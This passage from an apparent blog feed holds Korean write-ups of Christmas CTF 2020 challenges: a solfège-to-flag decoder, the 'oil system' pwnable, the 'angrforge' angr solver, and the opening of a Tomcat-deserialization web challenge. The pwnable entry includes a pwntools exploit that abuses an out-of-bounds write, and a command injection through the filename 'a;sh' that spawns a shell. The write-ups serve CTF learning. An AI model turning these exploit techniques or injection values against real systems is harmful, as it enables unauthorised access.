class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;la&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;ti&#x27;</span>, <span class="hljs-string">&#x27;do&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;re&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>, <span class="hljs-string">&#x27;fa&#x27;</span>, <span class="hljs-string">&#x27;mi&#x27;</span>]idx = [<span class="hljs-number">6</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">5</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]flag = []pre_chk = <span class="hljs-number">0</span><span class="hljs-keyword">while</span>(len(flag) &lt; len(idx)):cur_chk = idx[len(flag)]buf = note[pre_chk:pre_chk+cur_chk]result = <span class="hljs-number">0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(buf)): <span class="hljs-keyword">if</span>(buf[i] == <span class="hljs-string">&#x27;la&#x27;</span>): result += <span class="hljs-number">0xa</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;ti&#x27;</span>): result += <span class="hljs-number">0xb</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;do&#x27;</span>): result += <span class="hljs-number">0xc</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;re&#x27;</span>): result += <span class="hljs-number">0xd</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;mi&#x27;</span>): result += <span class="hljs-number">0xe</span> <span class="hljs-keyword">elif</span>(buf[i] == <span class="hljs-string">&#x27;fa&#x27;</span>): result += <span class="hljs-number">0xf</span>flag.append(chr(result))print(<span class="hljs-string">&#x27;&#x27;</span>.join(flag))pre_chk += cur_chk</code></pre><pre><code class="hljs plain">XXMXMAXMASXMAS&#123;XMAS&#123;7XMAS&#123;7hXMAS&#123;7heXMAS&#123;7herXMAS&#123;7her3XMAS&#123;7her3_XMAS&#123;7her3_iXMAS&#123;7her3_i5XMAS&#123;7her3_i5_XMAS&#123;7her3_i5_nXMAS&#123;7her3_i5_noXMAS&#123;7her3_i5_no_XMAS&#123;7her3_i5_no_GXMAS&#123;7her3_i5_no_G_XMAS&#123;7her3_i5_no_G_iXMAS&#123;7her3_i5_no_G_inXMAS&#123;7her3_i5_no_G_in_XMAS&#123;7her3_i5_no_G_in_HXMAS&#123;7her3_i5_no_G_in_H3XMAS&#123;7her3_i5_no_G_in_H3XXMAS&#123;7her3_i5_no_G_in_H3X&#125;</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>misc</tag>
      
      <tag>scale</tag>
      
      <tag>hex</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - oil system</title>
    <link href="/2020/12/29/fabu1ous/oil-system/"/>
    <url>/2020/12/29/fabu1ous/oil-system/</url>
    
    <content type="html"><![CDATA[<h1 id="머릿말"><a href="#머릿말" class="headerlink" title="머릿말"></a>머릿말</h1><p>CVE-2020–15647는 Firefox Fennec v68.9.0에서 발생하는 Arbitrary local file access입니다. 파일을 Cache 할 때 해당 파일의 이름을 해쉬 해야 하지만 Firefox Fennec v68.9.0의 <code>content:// URI</code> 로직엔 존재하지 않기 때문에 Arbitrary local file access가 발생합니다. 이런 상황을 pwnable 문제로 구현해봤는데…</p><p><img src="/2020/12/29/fabu1ous/oil-system/1.png"></p><p>unintended solution으로 커멘드 인젝션이 존재합니다. 상위권 솔브가 모두 커멘드 인젝션이더군요… 하하하. 문제 검수 단계에서 커멘드 인젝션에 대한 말이 나와서 수정하고 검증까지 했는데 수정 안된 버전이 대회 때 올라갔네요.</p><p>oil-system 문제를 풀어주신 분들께 정말 죄송합니다. 조금 더 철저하게 준비했어야 됐는데…</p><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p><img src="/2020/12/29/fabu1ous/oil-system/2.png"></p><p><img src="/2020/12/29/fabu1ous/oil-system/3.png"></p><p>문제 바이너리는 subleq이라는 One-Instruction-Language system 에뮬레이터입니다. subleq 코드를 담고 있는 파일에서 데이터를 읽어와 스택에 저장하고 그 코드를 해석해 동작합니다. subleq코드를 해석하는 함수에 OOB 취약점이 존재해 리턴 값을 조작할 수 있습니다. subleq 코드를 담고 있는 파일을 cache 하는 루틴도 존재하는데 파일의 경로만 바뀔 뿐 파일명을 유지합니다. Write Code 기능으로 flag라는 파일을 생성하고 실제 flag파일이 cache 되도록 리턴 값을 유도하면 됩니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>OOB</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/4.png"></p><p>위 사진은 함수 subleq()의 코드입니다. a2의 index로 사용되는 v4와 v5의 최댓값이 존재하지 않기 때문에 oob write가 가능합니다. v4와 v5값를 이용해 a2보다 높은 주소에 있는 스택 어디든 참조할 수 있게 되고 리턴 값을 오염시킬 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">1234</span>)<span class="hljs-comment"># Write Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendafter(<span class="hljs-string">&#x27;Enter your Program\&#x27;s Name : &#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;Enter Code : &#x27;</span>,<span class="hljs-string">&#x27;4 166 -1 -1 -1054&#x27;</span>)<span class="hljs-comment"># Run Code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-comment"># Get flag with View Cached code</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)p.interactive()</code></pre><pre><code class="hljs routeros">[+] Opening<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> localhost on<span class="hljs-built_in"> port </span>1234: Done[*] Switching <span class="hljs-keyword">to</span> interactive modeXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125; ========[ Menu ]======== 1. Read test description 2. Write Code 3. <span class="hljs-builtin-name">Run</span> Code 4. View Cached code &gt; TIMEOUT[*] Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> interactive</code></pre><h1 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h1><ul><li>unintended solution</li></ul><p><img src="/2020/12/29/fabu1ous/oil-system/5.png"></p><p>파일명 필터 함수입니다. 파일명에 영문 소문자 이외의 입력이 들어온다면 프로세스를 종료합니다. 안타깝게도 유심히 보시면 첫 글자만 검사한다는 것을 알 수 있습니다. <s>문제 만든 놈이 픵신인듯</s></p><pre><code class="hljs plain"> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 2 Enter your Program&#39;s Name : a;sh Enter Code : your an idiot &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[ Menu ]&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; 1. Read test description 2. Write Code 3. Run Code 4. View Cached code &gt; 3 Error while fopen$ cat flagXMAS&#123;U5e_Ma11oc_Nex7_tim3_Mr_Kim&#125;$</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>pwnable</tag>
      
      <tag>oob</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - angrforge</title>
    <link href="/2020/12/29/idioth/christmasctf2020-angrforge/"/>
    <url>/2020/12/29/idioth/christmasctf2020-angrforge/</url>
    
    <content type="html"><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>angr를 통해 입력 값을 뽑아내는 것이 의도인 문제였습니다. 이 문제는 여러 번의 수정을 거쳤습니다. 원래 이 문제도 arm 환경에서 angr를 돌리는 문제로 낼 예정이었는데 arm에서 제대로 동작하지 않아서 arm은 포기. 그리고 원래 처음에는 c++로 냈었는데 검수 후 수정을 했더니 simulation manager를 돌려도 값이 제대로 나오지 않아서 c로 옮기는 과정에서 연산 몇 개를 뺐습니다..ㅠ</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ file angrforge<span class="hljs-attribute">angrforge</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked,<span class="hljs-attribute">interpreter</span> /lib<span class="hljs-number">64</span>/ld-linux-x<span class="hljs-number">86</span>-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>,<span class="hljs-attribute">BuildID</span>[sha<span class="hljs-number">1</span>]=<span class="hljs-number">1162</span>ed<span class="hljs-number">229</span>a<span class="hljs-number">12133</span>d<span class="hljs-number">07</span>de<span class="hljs-number">26301</span>dad<span class="hljs-number">1</span>ada<span class="hljs-number">34</span>a<span class="hljs-number">9</span>c<span class="hljs-number">3</span>ff, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, stripped</code></pre><p>64bit ELF 파일이며, stripped 되어있습니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_00103be1</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> iVar1;  <span class="hljs-keyword">long</span> in_FS_OFFSET;  undefined8 local_58;  undefined8 local_50;  undefined8 local_48;  undefined8 local_40;  undefined8 local_38;  undefined8 local_30;  undefined8 local_28;  undefined local_20;  <span class="hljs-keyword">long</span> local_10;    local_10 = *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>);  local_58 = <span class="hljs-number">0</span>;  local_50 = <span class="hljs-number">0</span>;  local_48 = <span class="hljs-number">0</span>;  local_40 = <span class="hljs-number">0</span>;  local_38 = <span class="hljs-number">0</span>;  local_30 = <span class="hljs-number">0</span>;  local_28 = <span class="hljs-number">0</span>;  local_20 = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;General Angerforge, the Dark Iron responsible for stealing my computer.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;But I\&#x27;m just a programmer.. so Call me my best warrior friend.&quot;</span>);  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;If you call my friend, I will give you a good reward.&quot;</span>);  fgets((<span class="hljs-keyword">char</span> *)&amp;local_58,<span class="hljs-number">0x39</span>,<span class="hljs-built_in">stdin</span>);  FUN_00103a48(&amp;local_58);  iVar1 = FUN_001039f7(&amp;local_58);  <span class="hljs-keyword">if</span> (iVar1 == <span class="hljs-number">1</span>) &#123;    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OMG, Thank you for your good works :)&quot;</span>);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001039d9();  &#125;  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-keyword">long</span> *)(in_FS_OFFSET + <span class="hljs-number">0x28</span>)) &#123;                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span>    __stack_chk_fail();  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ghidra를 통해 디컴파일을 한 후 main을 확인해보면, <code>0x39(57)</code>만큼의 입력 값을 받아서 <code>FUN_00103a48</code>을 호출하고, <code>FUN_001039f7</code>을 통해 문자열을 체크하는 것을 확인할 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_00103a48</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *param_1)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">size_t</span> sVar1;    sVar1 = <span class="hljs-built_in">strlen</span>(param_1);  <span class="hljs-keyword">if</span> (sVar1 &lt; (ulong)(<span class="hljs-keyword">long</span>)(<span class="hljs-keyword">int</span>)((DAT_00106014 | DAT_00106010) + <span class="hljs-number">5</span>)) &#123;    FUN_001033e9(param_1);    FUN_00103481(param_1);    FUN_00103519(param_1);    FUN_001035b1(param_1);    FUN_00103649(param_1);    FUN_001036e1(param_1);    FUN_00103779(param_1);    FUN_00103811(param_1);    FUN_001038a9(param_1);    FUN_00103941(param_1);  &#125;  <span class="hljs-keyword">else</span> &#123;    FUN_001011c9(param_1);    FUN_00101396(param_1);    FUN_00101563(param_1);    FUN_00101730(param_1);    FUN_001018fd(param_1);    FUN_00101abf(param_1);    FUN_00101bbf(param_1);    FUN_00101cce(param_1);    FUN_00101dce(param_1);    FUN_00101eee(param_1);    FUN_001022cb(param_1);    FUN_00102589(param_1);    FUN_00102847(param_1);    FUN_00102b05(param_1);    FUN_00102dc3(param_1);    FUN_00102ef9(param_1);    FUN_00103035(param_1);    FUN_00103171(param_1);    FUN_001032ad(param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p><code>FUN_00103a48</code> 함수는 입력 값을 받아서, 길이에 따라서 여러 가지 다른 sub 함수를 수행합니다. 각 sub 함수의 연산은 서로 다른 바이트에 영향을 미치지 않고 함수가 다른 함수를 호출하는 로직도 있어서 상당히 복잡하게 얽혀있습니다. c++에는 곱 연산 같은 것도 넣었는데 c로 급하게 옮기면서 보니 바이트가 증발하더군요..ㅠ <del>시간 부족으로 인한 역 연산 가능 로직</del></p><pre><code class="hljs c"><span class="hljs-function">undefined8 <span class="hljs-title">FUN_001039f7</span><span class="hljs-params">(<span class="hljs-keyword">long</span> param_1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> local_c;    local_c = <span class="hljs-number">0</span>;  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;    <span class="hljs-keyword">if</span> (<span class="hljs-number">0x37</span> &lt; local_c) &#123;      <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">if</span> (*(<span class="hljs-keyword">char</span> *)(param_1 + local_c) != (&amp;DAT_00104080)[local_c]) <span class="hljs-keyword">break</span>;    local_c = local_c + <span class="hljs-number">1</span>;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>FUN_001039f7</code>에서는 0x38만큼 <code>DAT_00104080</code>과 값을 비교하여 맞으면 <code>1</code>, 아닐 시 <code>0</code>을 리턴해줍니다.</p><p><code>\n</code>을 제외한 문자열의 길이는 56이고, <code>stdin</code>을 통해 입력 값이 들어가므로 입력 값 56과 <code>stdin</code>을 처리하는 state를 구성하여 simulation manager를 돌리면 값을 구할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripyp = angr.Project(<span class="hljs-string">&#x27;./angrforge&#x27;</span>)flag_chars = [claripy.BVS(<span class="hljs-string">&#x27;flag_%d&#x27;</span> % i, <span class="hljs-number">8</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">56</span>)]flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="hljs-string">b&#x27;\n&#x27;</span>)])st = p.factory.full_init_state(    stdin = flag,    add_options = angr.options.unicorn,)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag_chars:    st.solver.add(i != <span class="hljs-number">0</span>)    st.solver.add(i != <span class="hljs-number">10</span>)sm = p.factory.simulation_manager(st)sm.run()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sm.deadended:    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;OMG&#x27;</span> <span class="hljs-keyword">in</span> i.posix.dumps(<span class="hljs-number">1</span>):        print(i.posix.dumps(<span class="hljs-number">0</span>))</code></pre><pre><code class="hljs apache"><span class="hljs-attribute">idioth</span>@ubuntu:~/Desktop$ python<span class="hljs-number">3</span> solve.py<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">44</span>,<span class="hljs-number">086</span> | cle.loader | The main binary is a position-independent executable.<span class="hljs-attribute">It</span> is being loaded with a base address of <span class="hljs-number">0</span>x<span class="hljs-number">400000</span>.<span class="hljs-attribute">WARNING</span> | <span class="hljs-number">2020</span>-<span class="hljs-number">12</span>-<span class="hljs-number">28</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">45</span>,<span class="hljs-number">089</span> | angr.simos.simos | stdin is constrained to <span class="hljs-number">57</span> bytes (has_end=True).<span class="hljs-attribute">If</span> you are only providing the first <span class="hljs-number">57</span> bytes instead of the entire stdin,<span class="hljs-attribute">please</span> use stdin=SimFileStream(name=&#x27;stdin&#x27;, content=your_first_n_bytes, has_end=False).<span class="hljs-attribute">b</span>&#x27;XMAS&#123;h<span class="hljs-number">3</span>_<span class="hljs-number">1</span>s_b<span class="hljs-number">1</span>o<span class="hljs-number">0</span>d<span class="hljs-number">3</span>lf_d<span class="hljs-number">3</span>athkni<span class="hljs-number">9</span>ht_wh<span class="hljs-number">0</span>_will_kill_<span class="hljs-number">4</span>ngrf<span class="hljs-number">0</span>rge&#125;\n&#x27;</code></pre><p>Flag : XMAS{h3_1s_b1o0d3lf_d3athkni9ht_wh0_will_kill_4ngrf0rge}</p>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>angr</tag>
      
      <tag>christmas ctf 2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - gift</title>
    <link href="/2020/12/29/idioth/christmasctf2020-gift/"/>
    <url>/2020/12/29/idioth/christmasctf2020-gift/</url>
    
    <content type="html"><![CDATA[<h1 id="출제-의도"><a href="#출제-의도" class="headerlink" title="출제 의도"></a>출제 의도</h1><p>올해 초에 발표된 Apache Tomcat CVE-2020-9484를 이용해서 문제를 만들어보고 싶었습니다. 문제를 만들면서 이 취약점이 있는 서비스를 만들고 싶은데… 만약 이런 사이트가 있었다면 어떤 식으로 취약점에 접근할 수 있을까?라는 생각을 하면서 만들었습니다.</p><p>session이 저장되는 위치와 자신이 올린 파일이 업로드되는 위치를 모두 알아야 하고 또 해당 취약점에 취약한 버전이라는 것도 알아야 해서 local에 있는 파일을 모두 볼 수 있으면 되겠다는 생각을 했습니다. <del>lock과 angrforge의 허술함은 여기에서 왔다.</del></p><p>RCE를 활용해야 한다는 것과 실행할 파일의 위치를 <code>special.jsp</code>에 넣어놨는데 좀 더 잘 보이는 곳에 넣어둘 걸… 하는 생각을 했습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image.jpg"></p><p>제가 웹 알못이다 보니 이런저런 것을 구현할 때 주위의 웹 하는 친구들한테 물어보며 이거 이러이러하게 해서 플래그에 접근하는 건데 게싱이 심하지 않을까? 사람들이 이런 식으로 접근할 수 있을까? 내가 이거 어떻게 하는지 잘 몰라서 이렇게 해봤는데 괜찮을까? 물어보면서 만들었습니다. <del>일단 있는 거 다 해보고 파일은 다 찾아본다며</del></p><p>구현을 도와준다던 놈들은 jsp라고 하니까 다 도망가더군요 하하하… 잡설이 길었습니다.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image0.png"></p><p>메인 화면입니다. 저기 깃발(flag) 모양에 Special gift가 숨겨져 있다!라고 되어있습니다. 이걸 description에 적어놨으면 참 좋았을걸 왜 안 적어놨지? 일단 로그인을 해야 기능을 볼 수 있는 것 같으니 로그인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image1.png"></p><p>로그인을 하면 제공하는 기능을 볼 수 있습니다. 사이트에서 제공하는 기능을 정리하면 아래와 같습니다.</p><ul><li><code>Gift List</code><ul><li>전송한 선물의 리스트를 볼 수 있다.</li><li>file name을 <code>GET</code>을 통해 받는다.</li></ul></li><li><code>Send List</code><ul><li>선물을 전송할 수 있다.</li></ul></li><li><code>Community</code><ul><li>게시판 기능으로 글을 작성할 수 있다.</li></ul></li></ul><p>선물을 전송하면 산타가 그 선물을 준다고 하고 gift list에서 올린 선물 리스트의 내용을 확인할 수 있으니 일단 <code>Send List</code>를 통해 선물을 전송하고 난 후 <code>Gift List</code>에서 어떠한 식으로 확인할 수 있는지를 확인해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image2.png"></p><p>txt 파일과 자신들의 secret한 파일만 올릴 수 있다고 하니 일단 txt 파일을 올려봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image3.png"></p><p>전송이 완료된 후 <code>Gift List</code>를 통해 파일 리스트를 확인하면 <code>&lt;name&gt;</code>‘s gift list라는 제목과 함께 업로드한 파일이 표시가 되고 해당 파일의 내용을 확인할 수 있습니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image4.png"></p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image5.png"></p><p>gift list를 불러올 때 사용되는 <code>&lt;name&gt;</code>은 <code>GET</code>을 통해 불러오는 것으로 추정되므로 해당 인자 값을 수정해봅니다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image6.png"></p><p>name을 변경하자 testa’s gift list를 읽어오고 아무것도 출력이 안 되는 것을 볼 수 있습니다.</p><p>name에 따라 다른 디렉터리를 생성하고 해당 폴더에 파일이 올라간다는 가설을 세우고 path traversal이 가능한지 확인을 해봅시다.</p><p><img src="/2020/12/29/idioth/christmasctf2020-gift/image7.png"></p><p>name에 <code>.</code>을 입력하자 아까 